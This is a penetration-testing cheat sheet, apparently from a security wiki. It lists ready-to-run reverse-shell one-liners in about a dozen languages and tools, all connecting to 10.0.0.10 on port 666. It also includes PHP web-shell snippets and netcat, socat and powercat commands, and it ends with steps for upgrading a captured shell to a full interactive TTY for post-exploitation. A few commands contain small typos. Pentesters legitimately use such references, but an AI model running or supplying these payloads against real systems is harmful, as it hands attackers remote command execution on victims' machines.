# Reverse Shell Cheatsheet

**Bash**

```bash
bash -i >& /dev/tcp/10.0.0.10/666 0>&1
```

*or*

```bash
0<&196;exec 196<>/dev/tcp/10.0.0.10/666; sh <&196 >&196 2>&196
```

*or*

```bash
bash -c 'bash -i >& /dev/tcp/10.0.0.10/666 0>&1'
```

**PowerShell**

```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.10',666);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -Name System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

**Python for Linux**

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.10",666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

*or*

```python
__import__("os").system("bash -c 'bash -i >& /dev/tcp/10.0.0.10/666 0>&1'")
```

**Python for Windows**

```
exec("""import os, socket, subprocess, threading, sys\ndef s2p(s, p):\n    while True:p.stdin.write(s.recv(1024).decode()); p.stdin.flush()\ndef p2s(s, p):\n    while True: s.send(p.stdout.read(1).encode())\ns=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nwhile True:\n    try: s.connect(("10.0.0.10",666)); break\n    except: pass\np=subprocess.Popen(["powershell.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)\nthreading.Thread(target=s2p, args=[s,p], daemon=True).start()\nthreading.Thread(target=p2s, args=[s,p], daemon=True).start()\ntry: p.wait()\nexcept: s.close(); sys.exit(0)""")
```

*or*

```
python -c 'exec("""import os, socket, subprocess, threading, sys\ndef s2p(s, p):\n    while True:p.stdin.write(s.recv(1024).decode()); p.stdin.flush()\ndef p2s(s, p):\n    while True: s.send(p.stdout.read(1).encode())\ns=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nwhile True:\n    try: s.connect(("10.0.0.10",666)); break\n    except: pass\np=subprocess.Popen(["powershell.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)\nthreading.Thread(target=s2p, args=[s,p], daemon=True).start()\nthreading.Thread(target=p2s, args=[s,p], daemon=True).start()\ntry: p.wait()\nexcept: s.close(); sys.exit(0)""")
```

**Perl**

```
perl -e 'use Socket;$i="10.0.0.10";$p=666;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

**PHP**

```
php -r '$sock=fsockopen("10.0.0.10",666);exec("/bin/sh -i <&3 >&3 2>&3");'
```

**Ruby**

```
ruby -rsocket -e'f=TCPSocket.open("10.0.0.10",666).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

**Java**

```
r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.10/666;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]); p.waitFor();
```

**Lua**

```
lua -e "local s=require('socket');local t=assert(s.tcp());t:connect('10.0.0.10',666);while true do local r,x=t:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));t:send(b);end;f:close();t:close();" 
```

**Telnet**

```
telnet localhost 443 | /bin/sh | telnet localhost 444
```

**Xterm**

```
xterm -display 10.0.0.10:1
```

***

### PHP Web Pages <a href="#php-web-pages" id="php-web-pages"></a>

**Linux**

```
<?php echo shell_exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.10/666 0>&1'")?>
```

**Windows**

```
<?php echo shell_exec("powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.10',666);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -Name System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"")?>
```

***

### Tools <a href="#tools" id="tools"></a>

**Netcat**

```
nc -e /bin/sh 10.0.0.10 666
```

**Netcat without -e**

```
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.10 666 > /tmp/f
```

**Socat**

```
user@ubuntu:~$ socat - TCP4:10.0.0.10:666 EXEC:'/bin/bash -li'
C:\> socat TCP4:10.0.0.10:666 EXEC:'cmd.exe'
```

**Powercat**

```
powercat -c 10.0.0.10 -p 666 -e cmd.exe
```

<br>

# Linux TTY Shell Cheat Sheet

### **Introduction**

During a penetration test, when obtaining access to a remote Linux host via a reverse/bind shell, it can be very painful to issue certain commands over it and it is often a much better option to obtain an interactive shell. These are the main reason why this is a good idea:

* More shell stability, as things like CTRL+C will no longer close down the connection.
* Ability to use up, down, left, and right arrows to navigate through and modify commands.
* Ability to use applications or commands that use a login prompt such as Sudo, MySQL, SSH, etc.
* Ability to use tab-auto completion in commands.
* Ability to view commands, output, and file contents in the same terminal size as the host machine.

This article will list the various commands that can be used to obtain a TTY shell and also how to turn it into a fully interactive shell.

### **Cheat Sheet**

The following table contains commands to execute in various scripting languages and tools to

<table data-header-hidden><thead><tr><th></th><th></th></tr></thead><tbody><tr><td><strong>Command</strong></td><td><strong>Description</strong></td></tr><tr><td><pre class="language-sh"><code class="lang-sh">SHELL=/bin/bash script -q /dev/null
</code></pre></td><td>Shell to Bash TTY shell</td></tr><tr><td><pre class="language-python"><code class="lang-python">python -c 'import pty; pty.spawn("/bin/bash")'
</code></pre></td><td>Python BASH TTY shell</td></tr><tr><td><pre class="language-python"><code class="lang-python">python3 -c 'import pty; pty.spawn(“/bin/bash”)'
</code></pre></td><td>Python 3 BASH TTY shell</td></tr><tr><td><pre class="language-bash"><code class="lang-bash">echo os.system('/bin/bash')
</code></pre></td><td>Echo BASH TTY shell</td></tr><tr><td><pre class="language-bash"><code class="lang-bash">/bin/bash -i
</code></pre></td><td>BASH TTY shell</td></tr><tr><td><pre class="language-perl"><code class="lang-perl">perl -e 'exec "/bin/bash";'
</code></pre></td><td>Perl BASH TTY shell</td></tr><tr><td><pre class="language-ruby"><code class="lang-ruby">ruby -e 'exec "/bin/bash"'
</code></pre></td><td>Ruby BASH TTY shell</td></tr><tr><td><pre class="language-lua"><code class="lang-lua">lua: os.execute('/bin/sh')
</code></pre></td><td>Lua BASH TTY shell</td></tr><tr><td><pre class="language-birb"><code class="lang-birb">exec "/bin/sh"
</code></pre></td><td>IRB BASH TTY shelll</td></tr><tr><td><pre class="language-vim"><code class="lang-vim">:!bash
</code></pre></td><td>Vi/Vim BASH TTY shell</td></tr><tr><td><pre class="language-vim"><code class="lang-vim">:set shell=/bin/bash:shell
</code></pre></td><td>Vi/Vim BASH TTY shell</td></tr><tr><td><pre><code>CTRO+R CTRL+X reset; /bin/bash 1>&#x26;0 2>&#x26;0
</code></pre></td><td>Nano BASH TTY shell</td></tr><tr><td><pre><code>!bash
</code></pre></td><td>Nmap BASH TTY shell</td></tr></tbody></table>

### **Obtaining a Fully Interactive Shell**

The commands used above can also be issued with sh or /bin/sh, rather than bash or /bin/bash, if BASH is not an option. Once a TTY shell has been achieved, the following commands can be used in order to obtain a fully interactive shell:

```
#backgrounding the shell process
Ctrl-Z
#checking the number of rows and columns in the host terminal
stty -a
#setting terminal settings like new line, break characters etc.
stty raw -echo
#returning to the shell
fg + ENTER
#declaring environment variables to be able to use cllear etc. and colors
reset
export SHELL=bash
export TERM=xterm-256color
#setting the terminal rows and columns based on the host configuration
stty rows <num> columns <cols>
```

### **Conclusion**

Having a fully interactive shell can help immensely while enumerating a given host, performing post exploitation techniques and attempting to escalate privileges, and as most Linux systems come with Python or other scripting languages already installed, obtaining one should be fairly effortless.
